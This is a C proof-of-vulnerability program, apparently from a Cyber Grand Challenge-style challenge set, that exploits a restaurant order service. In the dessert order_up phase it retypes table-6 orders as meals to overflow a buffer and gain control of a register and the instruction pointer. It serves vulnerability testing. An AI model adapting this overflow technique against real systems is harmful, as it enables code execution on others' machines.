/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
#include "menu.h"
#include "order.h"

#define DEBUG 1

#define TARGET_TABLE_ID 	6
#define MAX_TABLE_SZ		10
#define CUSTOMER_COUNT 		MAX_TABLE_SZ * TARGET_TABLE_ID

#ifdef DEBUG
#define DBG(msg, len)			transmit_all(2, msg, len)
#else
#define DBG(msg, len)
#endif

#define SEND_CMD(cmd)			transmit_all(1, cmd, 4)
#define SEND_FOOD(food, len)	transmit_all(1, (char *)food, len)
#define SEND_UINT(i_val) 		transmit_all(1, (unsigned char *)i_val, 4)
#define SEND_UCHAR(c_val) 		transmit_all(1, (unsigned char *)c_val, 1)
#define SEND_IDS(ids)			transmit_all(1, (unsigned char *)ids, 8)

#define RECV_OK(ok_buf)			length_read(0, (unsigned char *)ok_buf, 2)
#define RECV_FOOD(food, len)	length_read(0, (unsigned char *)food, len)
#define RECV_UINT(i_val)		length_read(0, (unsigned char *)i_val, 4)
#define RECV_UCHAR(c_val)		length_read(0, (unsigned char *)c_val, 1)
#define RECV_IDS(ids) 			length_read(0, (unsigned char *)ids, 8)

static const char CMD_ADD_CUST[4] 		= {'\xEE','\x01','\xEE','\x01'};
static const char CMD_GET_ORDERS[4] 	= {'\x01','\xEE','\x01','\xEE'};
static const char CMD_ORDER_UP[4] 		= {'\x0E','\x0E','\x0E','\x0E'};
static const char CMD_QUIT[4] 			= {'\xB0','\x01','\xB0','\x01'};

// 100 char random string
static const char *FOOD = "eq3YXkcE9wTLUqp9i5LhQVLegvjMR19LCQFVZR5Kc6UnQbNYbTtZ69XJU8ObGKeFCQuypxNlUZr27CmrsIX7RivQISuSOurxu6tb";


int main(void) {
   unsigned int reg, ip;
   type1_vals t1vals;
   type1_negotiate(0x0fffff80, 0xffffff80, 2, &t1vals);
   reg = t1vals.regval; // c_id
   ip = t1vals.ipval|0xf0000000; // make sure it's in kernel space // bytes 25-28 in a MEAL

   unsigned char ok_buf[2] = {0};
   unsigned char seated = 0;
   unsigned char c_count = CUSTOMER_COUNT;

   /* add_customer
   		send add_customer cmd
		send CUSTOMER_COUNT
   		generate and send CUSTOMER_COUNT customer ids (c_ids) 
   		recv # of seated customers
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_ADD_CUST);
   	SEND_UCHAR(&c_count);
   	for (int i = 0; i < CUSTOMER_COUNT; i++) {
   		SEND_UINT(&reg);
   		reg++;
   	}
   	RECV_UCHAR(&seated);
   	RECV_OK(ok_buf);


   Order *o_list = NULL;
   Order *o = NULL;
   unsigned char o_count = 0;
   unsigned int ids[2] = {0};

   Appetizer *app = NULL;
   Meal *meal = NULL;
   Dessert *des = NULL;
   	/* app get_orders
   		send get_orders cmd
   		recv # of orders
   		recv orders
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_GET_ORDERS);
   	RECV_UCHAR(&o_count);
   	for (unsigned int i = 0; i < o_count; i++) {
   		o = malloc(sizeof(Order));
   		if (!o) return -1;

   		RECV_IDS(ids);
   		o->t_id = ids[0];
   		o->c_id = ids[1];

   		app = malloc(sizeof(Appetizer));
   		if (!app) return -1;
   		RECV_FOOD(app, sizeof(Appetizer) - sizeof(void *));
   		o->item = app;
   		o->ftype = app->ftype;
   		append_order_to_list(&o_list, o);
   	}
   	RECV_OK(ok_buf);

   	/* app order_up
   		send order_up cmd
   		send # of orders
   		send orders
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_ORDER_UP);
   	SEND_UCHAR(&o_count);
   	o = pop_order_from_list(&o_list);
   	while (o) {
   		ids[0] = o->t_id;
   		ids[1] = o->c_id;
   		SEND_IDS(ids);

   		SEND_UINT(&o->ftype);
   		app = o->item;
   		SEND_FOOD(app->name, APP_NAME_SZ);

	   	free(o->item);
	   	free(o);
	   	o = pop_order_from_list(&o_list);
   	}
   	RECV_OK(ok_buf);

	/* meal get_orders
   		send get_orders cmd
   		recv # of orders
   		recv orders
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_GET_ORDERS);
   	RECV_UCHAR(&o_count);
   	for (unsigned int i = 0; i < o_count; i++) {
   		o = malloc(sizeof(Order));
   		if (!o) return -1;

   		RECV_IDS(ids);
   		o->t_id = ids[0];
   		o->c_id = ids[1];

   		meal = malloc(sizeof(Meal));
   		if (!meal) return -1;
   		RECV_FOOD(meal, sizeof(Meal) - sizeof(void *));
   		o->item = meal;
   		o->ftype = meal->ftype;
   		append_order_to_list(&o_list, o);
   	}
   	RECV_OK(ok_buf);

   	/* meal order_up
   		send order_up cmd
   		send # of orders
   		send orders
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_ORDER_UP);
   	SEND_UCHAR(&o_count);
   	o = pop_order_from_list(&o_list);
   	while (o) {
   		ids[0] = o->t_id;
   		ids[1] = o->c_id;
   		SEND_IDS(ids);

   		SEND_UINT(&o->ftype);
   		meal = o->item;
   		SEND_FOOD(meal->name, MEAL_NAME_SZ + MEAL_MAIN_SZ + MEAL_VEG_SZ + MEAL_SIDE_SZ);

	   	free(o->item);
	   	free(o);
	   	o = pop_order_from_list(&o_list);
   	}
   	RECV_OK(ok_buf);

	/* des get_orders
   		send get_orders cmd
   		recv # of orders
   		recv orders
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_GET_ORDERS);
   	RECV_UCHAR(&o_count);
   	for (unsigned int i = 0; i < o_count; i++) {
   		o = malloc(sizeof(Order));
   		if (!o) return -1;

   		RECV_IDS(ids);
   		o->t_id = ids[0];
   		o->c_id = ids[1];

   		des = malloc(sizeof(Dessert));
   		if (!des) return -1;
   		RECV_FOOD(des, sizeof(Dessert) - sizeof(void *));
   		o->item = des;
   		o->ftype = des->ftype;
   		append_order_to_list(&o_list, o);
   	}
   	RECV_OK(ok_buf);

   	/* des order_up
   		send order_up cmd
   		send # of orders
   		send orders (MOD orders for TARGET_TABLE_ID to be MEALs)
   			send 24 bytes
   			send 4 byte ip
   			send 52 bytes
   		recv STATUS_OK
   	*/
   	SEND_CMD(CMD_ORDER_UP);
   	SEND_UCHAR(&o_count);
   	o = pop_order_from_list(&o_list);
   	while (o) {
   		ids[0] = o->t_id;
   		ids[1] = o->c_id;
   		SEND_IDS(ids);

   		if (TARGET_TABLE_ID == o->t_id) { // POV
   			o->ftype = MEAL_TYPE;
	   		SEND_UINT(&o->ftype);
	   		meal = o->item;
	   		SEND_FOOD(&FOOD[TARGET_TABLE_ID], 24);

	   		SEND_UINT(&ip);
	   		ip++;

	   		SEND_FOOD(&FOOD[TARGET_TABLE_ID], 52);
   		} else { // not POV
	   		SEND_UINT(&o->ftype);
	   		des = o->item;
	   		SEND_FOOD(des->name, DES_NAME_SZ);
   		}

	   	free(o->item);
	   	free(o);
	   	o = pop_order_from_list(&o_list);
   	}
   	RECV_OK(ok_buf);

   	/* quit */
   	SEND_CMD(CMD_QUIT);
   	RECV_OK(ok_buf);

   	return 0;
}